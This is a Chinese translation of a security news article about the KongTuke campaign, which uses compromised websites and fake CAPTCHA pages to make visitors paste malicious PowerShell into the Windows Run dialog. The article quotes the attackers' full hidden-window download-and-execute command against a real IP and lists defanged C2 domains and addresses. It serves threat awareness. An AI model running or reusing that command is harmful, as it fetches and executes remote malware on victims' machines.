---
title: 紧急！KongTuke 攻击链借虚假验证码窃取用户信息
url: https://www.anquanke.com/post/id/306241
source: 安全客-有思想的安全新媒体
date: 2025-04-08
fetch_date: 2025-10-06T22:02:45.201562
---

# 紧急！KongTuke 攻击链借虚假验证码窃取用户信息

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 紧急！KongTuke 攻击链借虚假验证码窃取用户信息

阅读量**54257**

发布时间 : 2025-04-07 10:47:21

**x**

##### 译文声明

本文是翻译文章，文章原作者 Balaji N，文章来源：cybersecuritynews

原文地址：<https://cybersecuritynews.com/fake-captcha/>

译文仅供参考，具体内容表达以及含义原文为准。

网络安全研究人员发现了一种复杂的新型网络攻击链，名为 KongTuke，它通过被攻陷的合法网站，瞄准毫无防备的互联网用户。

Palo Alto Networks Unit 42 团队的 Bradley Duncan 在一份报告中详细介绍了这种攻击方式。该攻击利用恶意脚本和虚假验证码页面，劫持受害者的剪贴板，并有可能安装不明恶意软件。

这些研究结果于 2025 年 4 月 4 日公布，Unit 42 Intel 在 X 平台（原推特）上发布了更多相关见解，凸显了这场攻击活动日益增长的威胁。

### ****攻击链****

KongTuke 攻击始于将恶意脚本注入合法但易受攻击的网站。报告中提到的一个例子是 hxxps://lancasternh [.] com/6t7y.js，它会将用户重定向到 hxxps://lancasternh [.] com/js.php 的二级脚本。

这个脚本会收集受害者设备的详细信息，包括 IP 地址、浏览器类型和引用数据，并以 base64 格式进行编码。

之后，用户会被引导至一个模仿验证码（一种用于区分人类和机器人的常见安全功能）的欺骗性 “验证您是人类” 页面。

然而，这个验证码是个骗局。该页面并非用于验证身份，而是采用了一种名为 “剪贴板劫持” 或 “粘贴劫持” 的技术。它会秘密地将一个恶意 PowerShell 脚本注入受害者的剪贴板，并附带指令，敦促用户通过 Windows 运行窗口粘贴并执行该脚本。

Duncan 详细描述的脚本内容如下：

powershell -w h -c “iex $(irm 138.199.156[.]22:8080/$($z = [datetime]::UtcNow; $y = ([datetime](’01/01/’ + ‘1970’)); $x = ($z – $y).TotalSeconds; $w = [math]::Floor($x); $v = $w – ($w % 16); [int64]$v))”

这条命令会连接到 138.199.156 [.] 22:8080 的远程服务器，根据时间戳计算来获取更多恶意负载。

### ****流量及感染后活动****

根据 Unit 42 的报告，一旦脚本被执行，就会发起一系列网络请求。初始流量包括对同一 IP 地址的 GET 和 POST 请求，随后会连接到诸如 ecduutcykpvkbim [.] top 和 bfidmcjejlilflg [.] top 等域名。

这些由 185.250.151 [.] 155:80 托管的域名，似乎是进一步感染的临时据点。感染后，受感染的系统会通过 173.232.146 [.] 62:25658，以 TLSv1.0 HTTPS 流量与 8qvihxy8x5nyixj [.] top 建立命令与控制（C2）通信。

有趣的是，受感染主机还会使用 api.ipify [.] org 和 ipinfo [.] io 等服务进行 IP 地址查询，收集城市、地区和国家等地理位置数据。虽然这一步本身并非恶意行为，但这表明攻击者在对受害者进行特征分析，以便实施有针对性的攻击。

### ****熟悉却难以捉摸的威胁****

包括 Mastodon 上的 @monitorsg 和 ThreatFox 在内的网络安全社区，都在 #KongTuke 话题标签下追踪 KongTuke攻击活动。

Duncan 指出，感染后的流量模式与知名远程访问木马 AsyncRAT 的观测模式相似。

然而，最终的恶意软件负载仍未确定，因为研究人员尚未获取样本进行分析。这种不确定性凸显了威胁的不断演变，以及对抗它所面临的挑战。

2025 年 4 月 4 日，Unit 42 Intel 在 X 平台上向公众发出警报：“在合法但遭到感染的网站页面中注入 #KongTuke 脚本会导致伪造的 #CAPTCHA 样式页面和 #ClipboardHijacking （#pastejacking）。

这些页面会要求用户将恶意脚本粘贴到运行窗口中。” 该帖子可在 https://x.com/Unit42\_Intel/status/1908253830166323637 访问，其中包含指向更多详细信息的链接以及虚假验证码页面的截图，强调了提高警惕的紧迫性。

报告作者 Bradley Duncan 在其报告中强调了这种攻击的阴险本质：“这个过程有时被称为‘剪贴板劫持’或‘粘贴劫持’，它以常规验证为幌子，诱使用户执行有害代码。”

利用被攻陷的合法网站增加了一层可信度，使得这种攻击尤为危险。

网络安全专家敦促用户在遇到验证码提示时要格外谨慎，尤其是那些要求手动执行脚本的验证码。合法的验证码通常是进行简单的任务，如图像选择，而不是复制粘贴代码。

用户还应保持系统更新，避免点击可疑链接，并使用强大的杀毒软件来检测和阻止此类威胁。

随着 KongTuke 攻击活动的持续演变，Unit 42 及其他研究人员正在努力识别最终的恶意软件，并破坏其攻击基础设施。目前，保持警惕仍是抵御这种狡猾地利用日常网络交互信任的最佳防御手段。

本文翻译自cybersecuritynews [原文链接](https://cybersecuritynews.com/fake-captcha/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/306241](/post/id/306241)

安全KER - 有思想的安全新媒体

本文转载自: [cybersecuritynews](https://cybersecuritynews.com/fake-captcha/)

如若转载,请注明出处： <https://cybersecuritynews.com/fake-captcha/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [网络攻击](/tag/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB)

**+1**1赞

收藏

![](https://p4.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p4.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p4.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=175868)

[安全客](/member.html?memberId=175868)

这个人太懒了，签名都懒得写一个

* 文章
* **376**

* 粉丝
* **1**

### TA的文章

* ##### [mavinject.exe 遭利用，黑客绕过安全防线入侵系统](/post/id/306961)

  2025-04-28 10:48:18
* ##### [Docker 惊现新型加密挖矿攻击，借 Teneo 平台开辟恶意获利新路径](/post/id/306959)

  2025-04-28 10:39:59
* ##### [Cloudflare 隧道遭滥用，恶意 RAT 传播威胁加剧](/post/id/306957)

  2025-04-28 10:34:35
* ##### [xrpl.js 库遭供应链攻击，超 290 万次下载用户私钥成窃取目标](/post/id/306953)

  2025-04-28 10:29:02
* ##### [恶意后门借 ViPNet 更新渗透，俄罗斯多行业数据安全拉响警报](/post/id/306951)

  2025-04-28 10:22:13

### 相关文章

* ##### [Morte僵尸网络被披露：正利用路由器与企业应用漏洞，迅速扩张其“加载器即服务”活动](/post/id/312444)

  2025-09-29 18:04:01
* ##### [Akira勒索软件利用SonicWall VPN账户发起急速入侵](/post/id/312438)

  2025-09-29 18:03:28
* ##### [DarkCloud信息窃取器现新变种：采用VB6混淆技术并新增加密货币钱包窃取功能，威胁显著升级](/post/id/312435)

  2025-09-29 18:02:53
* ##### [TamperedChef恶意软件兴起：欺诈应用利用经过签名的二进制文件与搜索引擎投毒劫持浏览器](/post/id/312432)

  2025-09-29 18:02:25
* ##### [黑客将SVG文件武器化，用于隐秘投递恶意负载](/post/id/312351)

  2025-09-24 16:44:10
* ##### [ShadowV2僵尸网络利用配置错误的AWS Docker容器构建DDoS攻击租用服务](/post/id/312381)

  2025-09-24 16:40:43
* ##### [npm软件包“fezbox”中被发现新型恶意软件，可利用二维码窃取用户凭据](/post/id/312387)

  2025-09-24 16:40:06

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)